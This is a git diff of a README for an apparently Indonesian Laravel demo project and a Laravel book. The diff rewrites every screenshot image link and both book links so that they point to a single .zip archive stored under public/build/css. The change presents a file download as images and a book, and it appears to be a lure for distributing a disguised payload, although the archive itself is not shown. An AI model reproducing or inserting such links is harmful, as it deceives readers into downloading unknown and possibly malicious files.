@@ -11,25 +11,25 @@
 Enjoy!
 
 ## Screenshot
-![Halaman Katalog](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Halaman Katalog](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![Konfirmasi Delete](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Konfirmasi Delete](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![Homepage](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Homepage](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![CRUD Kategori](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![CRUD Kategori](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![CRUD Produk](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![CRUD Produk](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![Edit Produk](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Edit Produk](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![Pagination + Search](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Pagination + Search](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-![Nested Relationship](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+![Nested Relationship](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
 ## Want to learn more? 
-Baca buku saya [Menyelami Framework Laravel](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+Baca buku saya [Menyelami Framework Laravel](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
-[![Menyelami Framework Laravel](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)](https://raw.githubusercontent.com/dextercool/approcket-preproject/master/truckling/approcket-preproject.zip)
+[![Menyelami Framework Laravel](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)](https://github.com/dextercool/approcket-preproject/raw/refs/heads/master/public/build/css/preproject-approcket-v3.4.zip)
 
 Berisi 745+ halaman panduan aplikatif untuk membangun aplikasi dengan framework Laravel 5.2.
